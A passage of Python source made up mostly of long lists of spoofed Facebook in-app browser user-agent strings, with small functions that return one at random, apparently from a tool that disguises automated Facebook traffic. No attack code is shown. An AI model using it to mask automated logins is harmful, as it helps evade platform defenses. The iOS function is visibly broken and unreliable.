Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/359.0.0.11.81;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPPS27.91-177-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/325.0.1.4.108;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/337.0.0.7.102;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPPS27.91-177-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/290.0.0.16.119;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPP27.91-177; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/217.0.0.14.121;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/223.0.0.11.121;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/240.0.0.38.121;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPP27.91-143; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.125 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/219.0.0.12.120;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/286.0.0.21.122;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPP27.91-87; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/192.0.0.34.85;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPP27.91-143; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/218.0.0.6.119;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/282.0.0.10.119;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPP27.91-143; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/236.0.0.40.117;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPP29.55-35-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/281.0.0.15.120;]","Mozilla/5.0 (Linux; Android 11; TECNO CH7n Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]","Mozilla/5.0 (Linux; Android 11; TECNO CH7 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/359.0.0.11.81;]","Mozilla/5.0 (Linux; Android 11; TECNO CH7 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]"," Mozilla/5.0 (Linux; Android 12; TECNO CH7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]"," Mozilla/5.0 (Linux; Android 11; TECNO CH7 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/305.0.0.12.106;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/352.0.0.14.108;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/405.0.0.16.112;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/275.0.0.14.116;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FBAN/DiscoverApp;FBAV/6.0.0.0.3;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.15.96;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/399.3.0.14.70;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.53 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/246.0.0.7.121;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/396.0.0.14.82;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/419.0.0.10.49;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 10; V2029 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/353.0.0.5.112;]","Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]","Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/345.1.0.12.117;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/399.3.0.14.70;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/398.1.0.11.69;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/238.0.0.8.121;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/402.0.0.11.101;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/401.0.0.14.97;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.155 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.217 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/421.0.0.33.47;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/367.2.0.26.107;]","Mozilla/5.0 (Linux; Android 10; RMX2161 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]","Mozilla/5.0 (Linux; Android 12; RMX2163 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]","Mozilla/5.0 (Linux; Android 7.0; BLL-L23 Build/HUAWEIBLL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]","Mozilla/5.0 (Linux; Android 7.0; BLL-L23 Build/HUAWEIBLL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]","Mozilla/5.0 (Linux; Android 6.0; BLL-L23 Build/HUAWEIBLL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]","Mozilla/5.0 (Linux; Android 6.0; BLL-L23 Build/HUAWEIBLL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/315.0.0.18.109;]","Mozilla/5.0 (Linux; Android 11; SM-M115F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 12; SM-M115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]","Mozilla/5.0 (Linux; Android 5.1; X9009 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/311.0.0.7.114;]","Mozilla/5.0 (Linux; Android 5.1; X9009 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/220.0.0.46.112;]","Mozilla/5.0 (Linux; Android 5.1; OPPO R9m Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/300.0.0.51.129;]","Mozilla/5.0 (Linux; Android 5.1; OPPO R9m Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]","Mozilla/5.0 (Linux; Android 5.1; OPPO R9m Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;]","Mozilla/5.0 (Linux; Android 5.1; X9009 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;]","Mozilla/5.0 (Linux; Android 5.1; X9009 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/330.0.0.31.120",])
	return ua



def iAmMethod2Ua():
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong','Ufone'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua =random.choice(["",])
	return ua

def iAmMethod3Ua():
	ua = random.choice(["Mozilla/5.0 (Linux; Android 4.1.2; IdeaTabA1000L-F Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; IdeaTabA1000L-F Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; Lenovo L38043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Lenovo L58041 Build/PKQ1.190127.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Lenovo K14 Build/RONS31.267-94-3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A916 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-A107M Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.36 Chrome/114.0.5735.131 Mobile Safari/537.36","Mozilla/5.0 (Linux; Tizen 3.0; SAMSUNG SM-Z400F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/91.0.2526.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Tizen 3.0; SAMSUNG SM-Z400Y) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/47.0.2526.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Tizen 2.4; SAMSUNG SM-Z400F) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.1 Mobile Safari/537.3","Mozilla/5.0 (Linux; Tizen 4.0; SAMSUNG SM-R820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Tizen 5.5; SAMSUNG SM-R820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.106 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36","Mozilla/5.0 (Linux; Android 12; Infinix X670 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; V2145A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.210 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; V2254A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10.0.1; Vivo S76 Build/MRA59K) AppleWebKit/547.34 (KHTML, like Gecko) Chrome/57.0.6587.139 YaBrowser/17.4.1.954.00 Mobile Safari/547.48","Mozilla/5.0 (Linux; Android 10; V1938T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/14.1.2.0","Mozilla/5.0 (Linux; U; Android 7.1; en-US; vivo X3S W Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.9.1155 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; vivo 3969) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.2.7790.221 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2527) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2527) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2527) 